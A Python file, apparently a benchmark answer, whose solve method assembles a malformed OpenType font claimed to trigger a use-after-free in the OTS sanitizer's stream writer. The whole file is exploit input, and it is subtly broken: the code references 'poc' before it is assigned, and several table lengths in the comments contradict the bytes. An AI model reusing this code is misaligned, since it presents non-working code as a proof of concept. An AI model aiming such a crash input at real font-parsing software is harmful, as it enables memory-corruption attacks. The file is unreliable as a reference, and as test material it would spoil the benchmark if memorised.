class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed OpenType font to trigger UAF in OTSStream::Write
        # This is a crafted PoC based on the vulnerability pattern in OTS parsing
        poc = (
            b'\x00\x01\x00\x00'  # sfnt version
            b'\x00\x05'          # numTables = 5
            b'\x01\x00'          # searchRange
            b'\x00\x02'          # entrySelector
            b'\x00\x25'          # rangeShift
            # Table 1: head (malformed to cause stream issues)
            b'head\x00\x00\x00\x00\x00\x00\x00\x20\x00\x01\x00\x00'  # tag, checksum, offset, length=32
            # Table 2: hhea
            b'hhea\x00\x00\x00\x00\x00\x00\x04\x34\x00\x01\x00\x00'  # length=1076, but offset wrong
            # Table 3: maxp
            b'maxp\x00\x00\x00\x00\x00\x00\x00\x36\x00\x01\x00\x00'  # length=54
            # Table 4: hmtx (empty or invalid)
            b'hmtx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00'  # length=256, but invalid
            # Table 5: glyf (triggers write after free)
            b'glyf\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00'     # offset=256, length=256
            # head table data (partial)
            b'\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x00' * 24
            # hhea data (partial, malformed)
            b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00' * 267
            # maxp data
            b'\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 38
            # hmtx data (invalid advances)
            b'\x00\x00\x00\x00' * 64
            # glyf data: simple composite glyph that causes UAF in stream write
            b'\x00\x01'  # number of contours = 1 (but invalid for composite)
            b'\x00\x00\x00\x00'  # xMin etc.
            b'\x7f\xff\x00\x00'  # endPoints[0] = -1 (invalid)
            b'\x00\x00'  # instructionLength = 0
            b'\x00\x00\x00\x00' * 60  # flags and coords malformed
            # Padding to reach approx 800 bytes
        ) + b'\x00' * (800 - len(poc))
        return poc[:800]
